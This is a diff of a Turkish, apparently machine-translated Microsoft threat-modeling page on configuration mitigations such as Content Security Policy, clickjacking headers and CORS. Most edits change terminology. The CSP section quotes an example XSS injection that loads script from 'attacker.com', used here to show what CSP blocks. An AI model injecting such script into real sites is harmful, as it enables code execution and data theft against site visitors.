@@ -17,12 +17,12 @@ ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
 ms.custom: devx-track-javascript, devx-track-csharp
-ms.openlocfilehash: 9410f06298bd40fe6e0bf8f3fca1be4b87f793ed
-ms.sourcegitcommit: 419cf179f9597936378ed5098ef77437dbf16295
+ms.openlocfilehash: 3aeaebe49999ce65779072f8579a404f9397d50d
+ms.sourcegitcommit: 58d3b3314df4ba3cabd4d4a6016b22fa5264f05a
 ms.translationtype: MT
 ms.contentlocale: tr-TR
-ms.lasthandoff: 08/27/2020
-ms.locfileid: "89004502"
+ms.lasthandoff: 09/02/2020
+ms.locfileid: "89299992"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Güvenlik çerçevesi: yapılandırma yönetimi | Karşı 
 | Ürün/hizmet | Makale |
@@ -42,11 +42,11 @@ ms.locfileid: "89004502"
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | İçerik [güvenlik Ilkesine giriş](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Içerik güvenlik ilkesi başvurusu](https://content-security-policy.com/), [güvenlik özellikleri](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [içerik güvenlik ilkesine giriş](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [CSP kullanabilir miyim?](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **Adımlar** | <p>İçerik Güvenlik Ilkesi (CSP), Web uygulaması sahiplerinin sitesinde katıştırılmış içerik üzerinde denetime sahip olmasını sağlayan bir W3C standardı olan bir derinlemesine savunma güvenlik mekanizmasıdır. CSP, Web sunucusuna bir HTTP yanıt üst bilgisi olarak eklenir ve tarayıcı tarafından istemci tarafında zorlanır. Bu, beyaz liste tabanlı bir ilkedir. bir Web sitesi, JavaScript gibi etkin içeriklerin yüklenebileceği bir güvenilen etki alanı kümesi bildirebilir.</p><p>CSP aşağıdaki güvenlik avantajlarını sağlar:</p><ul><li>**XSS 'ye karşı koruma:** Bir sayfa XSS ile savunmasızdır, bir saldırgan bunu 2 şekilde kullanabilir:<ul><li>Ekle `<script>malicious code</script>` . Bu yararlanma, CSP 'nin temel kısıtlaması nedeniyle çalışmayacak-1</li><li>Ekle `<script src="http://attacker.com/maliciousCode.js"/>` . Bu yararlanma, saldırgan tarafından denetlenen etki alanı CSP 'nin beyaz etki alanları listesinde yer almasından bu yana çalışmayacak</li></ul></li><li>**Veri taşalımı üzerinde denetim:** Bir Web sayfasındaki kötü amaçlı içerik bir dış Web sitesine bağlanmaya ve verileri çalmaya çalışırsa, bağlantı CSP tarafından iptal edilir. Bunun nedeni, hedef etki alanının CSP 'nin beyaz listesinde olmaması olabilir</li><li>**Tıklama-Jacking 'e karşı savunma:** tıklama-Jacking, bir yöneticinin orijinal bir Web sitesini çerçevelenmesini ve Kullanıcı Arabirimi öğelerine tıklamasını zorunlu kıbir saldırı tekniğidir. Bir yanıt üst bilgisi (X-Frame-Options) yapılandırılarak, şu anda tıklama-Jacking 'e karşı savunma yapılır. Tüm tarayıcılar bu üstbilgiye uymaz ve iletme CSP 'si, tıklama ile ilgili savunmanız için standart bir yol olacaktır</li><li>**Gerçek zamanlı saldırı raporlaması:** CSP etkin bir Web sitesine ekleme saldırısı varsa, tarayıcılar Web sunucusu üzerinde yapılandırılan bir uç noktaya otomatik olarak bir bildirim tetikler. Bu şekilde, CSP gerçek zamanlı bir uyarı sistemi işlevi görür.</li></ul> |
+| **Adımlar** | <p>İçerik Güvenlik Ilkesi (CSP), Web uygulaması sahiplerinin sitesinde katıştırılmış içerik üzerinde denetime sahip olmasını sağlayan bir W3C standardı olan bir derinlemesine savunma güvenlik mekanizmasıdır. CSP, Web sunucusuna bir HTTP yanıt üst bilgisi olarak eklenir ve tarayıcı tarafından istemci tarafında zorlanır. Bu, izin verilen bir liste tabanlı ilkedir. Web sitesi, JavaScript gibi etkin içeriklerin yüklenebileceği bir güvenilen etki alanı kümesi bildirebilir.</p><p>CSP aşağıdaki güvenlik avantajlarını sağlar:</p><ul><li>**XSS 'ye karşı koruma:** Bir sayfa XSS ile savunmasızdır, bir saldırgan bunu 2 şekilde kullanabilir:<ul><li>Ekle `<script>malicious code</script>` . Bu yararlanma, CSP 'nin temel kısıtlaması nedeniyle çalışmayacak-1</li><li>Ekle `<script src="http://attacker.com/maliciousCode.js"/>` . Bu yararlanma, saldırgan tarafından denetlenen etki alanının CSP 'nin izin verilen etki alanı listesinde olmaması nedeniyle çalışmaz</li></ul></li><li>**Veri taşalımı üzerinde denetim:** Bir Web sayfasındaki kötü amaçlı içerik bir dış Web sitesine bağlanmaya ve verileri çalmaya çalışırsa, bağlantı CSP tarafından iptal edilir. Bunun nedeni, hedef etki alanının CSP izin verilenler listesinde olmaması olabilir</li><li>**Tıklama-Jacking 'e karşı savunma:** tıklama-Jacking, bir yöneticinin orijinal bir Web sitesini çerçevelenmesini ve Kullanıcı Arabirimi öğelerine tıklamasını zorunlu kıbir saldırı tekniğidir. Bir yanıt üst bilgisi (X-Frame-Options) yapılandırılarak, şu anda tıklama-Jacking 'e karşı savunma yapılır. Tüm tarayıcılar bu üstbilgiye uymaz ve iletme CSP 'si, tıklama ile ilgili savunmanız için standart bir yol olacaktır</li><li>**Gerçek zamanlı saldırı raporlaması:** CSP etkin bir Web sitesine ekleme saldırısı varsa, tarayıcılar Web sunucusu üzerinde yapılandırılan bir uç noktaya otomatik olarak bir bildirim tetikler. Bu şekilde, CSP gerçek zamanlı bir uyarı sistemi işlevi görür.</li></ul> |
 
 ### <a name="example"></a>Örnek
 Örnek ilke: 
@@ -74,7 +74,7 @@ Example: var str="alert(1)"; eval(str);
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | [XSS koruma filtresi](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
@@ -85,7 +85,7 @@ Example: var str="alert(1)"; eval(str);
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | [ASP.NET hata ayıklamaya genel bakış](https://msdn.microsoft.com/library/ms227556.aspx), [ASP.net izlemeye genel bakış](https://msdn.microsoft.com/library/bb386420.aspx), [nasıl yapılır: bir ASP.NET uygulaması için izlemeyi etkinleştirme](https://msdn.microsoft.com/library/0x5wc973.aspx), [nasıl yapılır: ASP.NET uygulamaları için hata ayıklamayı etkinleştirme](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
@@ -96,7 +96,7 @@ Example: var str="alert(1)"; eval(str);
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | Yok  |
@@ -107,7 +107,7 @@ Example: var str="alert(1)"; eval(str);
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | [OWASP tıklama-Yiyilmez savunma sayfası](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html), [IE Iç Işlevleri-combating tıklama-X-Frame-Options ile çarpıcı](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
@@ -142,7 +142,7 @@ Yalnızca aynı etki alanındaki sayfalara göre çerçeveli olan siteler için 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | Web Forms, MVC5 |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | Yok  |
@@ -173,7 +173,7 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://exampl
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | Web Forms, MVC5 |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | [İstek Doğrulama - Betik Saldırılarını Önleme](https://www.asp.net/whitepapers/request-validation) |
@@ -199,7 +199,7 @@ Istek doğrulama özelliğinin desteklenmediğini ve MVC6 işlem hattının bir 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | Yok  |
@@ -210,7 +210,7 @@ Istek doğrulama özelliğinin desteklenmediğini ve MVC6 işlem hattının bir 
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | [IE8 güvenlik bölümü V: kapsamlı koruma](https://docs.microsoft.com/archive/blogs/ie/ie8-security-part-v-comprehensive-protection), [MIME türü](https://en.wikipedia.org/wiki/Mime_type) |
@@ -275,7 +275,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web Uygulaması | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | EnvironmentType-Azure |
 | **Başvurular**              | [Windows Azure Web sitelerinde standart sunucu üstbilgilerini kaldırma](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
@@ -286,7 +286,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Veritabanı | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | SQL Azure, Onprea |
 | **Öznitelikler**              | Yok, SQL sürümü-V12 |
 | **Başvurular**              | [Azure SQL veritabanı güvenlik duvarını yapılandırma](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [veritabanı altyapısı erişimi Için bir Windows Güvenlik Duvarı yapılandırma](https://msdn.microsoft.com/library/ms175043) |
@@ -297,7 +297,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web API | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | MVC 5 |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | [ASP.NET Web API 2 ' de çapraz kaynak Isteklerini etkinleştirme](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API 2 ' de ASP.NET Web api-cors desteği](https://msdn.microsoft.com/magazine/dn532203.aspx) |
@@ -393,7 +393,7 @@ public class ResourcesController : ApiController
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Web API | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | MVC 6 |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | [ASP.NET Core 1,0 ' de çıkış noktaları arası Istekleri (CORS) etkinleştirme](https://docs.asp.net/en/latest/security/cors.html) |
@@ -507,7 +507,7 @@ Bir denetleyici veya eylem için CORS 'yi devre dışı bırakmak için [Disable
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | IoT cihazı | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | [Windows 10 IoT Core 'da güvenli önyükleme ve bit dolabı cihaz şifrelemesini etkinleştirme](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
@@ -518,7 +518,7 @@ Bir denetleyici veya eylem için CORS 'yi devre dışı bırakmak için [Disable
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | IoT cihazı | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | Yok  |
@@ -562,7 +562,7 @@ Bir denetleyici veya eylem için CORS 'yi devre dışı bırakmak için [Disable
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | IoT bulut ağ geçidi | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Ağ Geçidi seçimi-Azure IoT Hub |
 | **Başvurular**              | [Cihaz yönetimine genel bakış IoT Hub](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/) [cihaz üretici yazılımını güncelleştirme](../../iot-hub/tutorial-firmware-update.md) |
@@ -595,7 +595,7 @@ Bir denetleyici veya eylem için CORS 'yi devre dışı bırakmak için [Disable
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | Azure Storage | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | Genel |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | [Azure Depolama Hizmetleri için CORS Desteği](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
@@ -606,7 +606,7 @@ Bir denetleyici veya eylem için CORS 'yi devre dışı bırakmak için [Disable
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | WCF | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | .NET Framework 3 |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [fortify Krallığı](https://vulncat.fortify.com) |
@@ -629,7 +629,7 @@ Aşağıda, azaltma etkin olan bir örnek yapılandırma verilmiştir:
 | Başlık                   | Ayrıntılar      |
 | ----------------------- | ------------ |
 | **Bileşen**               | WCF | 
-| **SDL aşaması**               | Yapı |  
+| **SDL aşaması**               | Oluşturma |  
 | **İlgili teknolojiler** | .NET Framework 3 |
 | **Öznitelikler**              | Yok  |
 | **Başvurular**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [fortify Krallığı](https://vulncat.fortify.com) |
